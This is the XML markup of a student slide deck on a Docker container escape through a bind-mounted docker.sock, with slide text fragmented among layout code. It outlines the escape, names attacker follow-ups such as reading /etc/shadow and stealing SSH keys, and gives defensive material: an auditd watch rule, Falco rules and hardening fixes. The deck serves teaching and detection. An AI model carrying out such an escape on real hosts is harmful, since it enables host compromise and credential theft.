            <a:endParaRPr lang="en-US" sz="105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DAB77E2F-26F5-D4E0-06FD-788F13FE78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443" y="777240"/>
            <a:ext cx="7503080" cy="328530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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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5: Proof of Host Access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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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19" y="756944"/>
            <a:ext cx="4526280" cy="2822074"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54E8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20040" y="3746190"/>
            <a:ext cx="4114800" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FEF2F2"/>
          </a:solidFill>
          <a:ln w="63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20040" y="374619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Escape command fired from inside the container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0" y="756944"/>
            <a:ext cx="4526280" cy="2822074"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EDF8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1B54E8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709160" y="3746186"/>
            <a:ext cx="4114800" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0FDF4"/>
          </a:solidFill>
          <a:ln w="635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709160" y="374618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appears directly on the host filesystem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" y="4107664"/>
            <a:ext cx="8503920" cy="640080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57200" y="4107664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file written from inside the escape container appears on the victim host's filesystem -&gt; boundary fully crossed. An attacker can now read /etc/shadow, steal SSH keys, plant backdoors, or pivot to the rest of the network.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="105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5509FB0-E3DC-6CA4-9088-F5076FF62F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99" y="756944"/>
            <a:ext cx="4526280" cy="2837637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A513A429-75D1-04E7-5CC6-A21C0A7139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19" y="756944"/>
            <a:ext cx="4526281" cy="283763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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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Approach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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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804672"/>
            <a:ext cx="8503920" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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57200" y="80467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Anomaly: escaped.txt appears in host /tmp from a container process -&gt; containers should NEVER write directly to the host filesystem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" y="1417320"/>
            <a:ext cx="274320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1B54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320040" y="1417320"/>
            <a:ext cx="2743200" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2FF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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11480" y="14173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5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1 -&gt; Pre-deployment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1892808"/>
            <a:ext cx="256032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Scan docker run commands and docker-compose files for docker.sock bind mounts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Flag before the container ever starts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Tools: Docker Bench for Security, Trivy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0" y="1417320"/>
            <a:ext cx="274320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3200400" y="1417320"/>
            <a:ext cx="2743200" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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291840" y="14173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2 -&gt; Runtime: auditd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91840" y="1892808"/>
            <a:ext cx="256032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Linux audit daemon monitors all access to /var/run/docker.sock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Container process touching the socket = immediate audit event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auditctl -w /var/run/docker.sock -p rwxa -k docker_sock_access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80760" y="1417320"/>
            <a:ext cx="274320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080760" y="1417320"/>
            <a:ext cx="2743200" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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172200" y="14173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3 -&gt; Runtime: Falco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172200" y="1892808"/>
            <a:ext cx="256032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Kernel-level security tool -&gt; built-in rules fire on socket access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Real-time alert: container ID, process name, syscall details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Rules: "Sensitive mount in container", "Container with docker.sock mount"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54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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2570"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0A257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Escape  |  241370107071  |  GTU-SET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804672"/>
            <a:ext cx="40690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20040" y="804672"/>
            <a:ext cx="4069080" cy="438912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11480" y="804672"/>
            <a:ext cx="3886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Went Wrong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298448"/>
            <a:ext cx="37947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docker.sock bind-mounted into the container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 had unsanitized input passed to shell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ran as root user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runtime security monitoring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tool assumed safe -&gt; left unsecured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804672"/>
            <a:ext cx="40690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754880" y="804672"/>
            <a:ext cx="4069080" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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846320" y="804672"/>
            <a:ext cx="3886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Fix It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92040" y="1298448"/>
            <a:ext cx="37947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bind-mount </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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docker.sock</a:t>
            </a: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-&gt; use rootless Docker or Podman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socket access needed, use Docker Socket Proxy (Tecnativa) to restrict API calls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Sanitize all input -&gt; use subprocess.run() with argument lists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containers as non-root using USER directive in Dockerfile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Falco or auditd rules for docker.sock monitoring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with Docker Bench or Trivy before deployment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257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1261872" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D4ED8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20040" y="960120"/>
            <a:ext cx="1261872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Vulnerable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581912" y="1303020"/>
            <a:ext cx="91440" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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1673352" y="960120"/>
            <a:ext cx="1261872" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E40A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1673352" y="960120"/>
            <a:ext cx="1261872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935224" y="1303020"/>
            <a:ext cx="91440" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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026664" y="960120"/>
            <a:ext cx="1261872" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4F46E5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026664" y="960120"/>
            <a:ext cx="1261872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288536" y="1303020"/>
            <a:ext cx="91440" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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4379976" y="960120"/>
            <a:ext cx="1261872" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="7C3AED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379976" y="960120"/>
            <a:ext cx="1261872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docker.sock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641848" y="1303020"/>
            <a:ext cx="91440" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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5733288" y="960120"/>
            <a:ext cx="1261872" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9D174D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733288" y="960120"/>
            <a:ext cx="1261872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Escape Container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Spawned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995160" y="1303020"/>
            <a:ext cx="91440" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AA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7086600" y="960120"/>
            <a:ext cx="1261872" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="991B1B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7086600" y="960120"/>
            <a:ext cx="1261872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Host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1920240"/>
            <a:ext cx="8503920" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162047"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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320040" y="1920240"/>
            <a:ext cx="73152" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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502920" y="1920240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exposed socket was enough to compromise the entire host system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20040" y="2670048"/>
            <a:ext cx="8503920" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162047"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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320040" y="2670048"/>
            <a:ext cx="73152" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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02920" y="2670048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 vulnerability + a socket misconfiguration = complete host compromise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20040" y="3419856"/>
            <a:ext cx="8503920" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="162047"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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320040" y="3419856"/>
            <a:ext cx="73152" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B54E8"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1B54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502920" y="3419856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is layered: secure the code, secure the container config, monitor at runtime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28016" y="4799743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Zala Vishmayraj Jagjitsingh  |  241370107071  |  GTU - SET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1287</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>143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Docker Escape — Attack &amp; Detection</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Zala Vishmayraj Jagjitsingh</dc:creator>
  <cp:lastModifiedBy>Vishmayraj Zala</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-22T11:47:45Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-22T12:55:57Z</dcterms:modified>
</cp:coreProperties>
</file>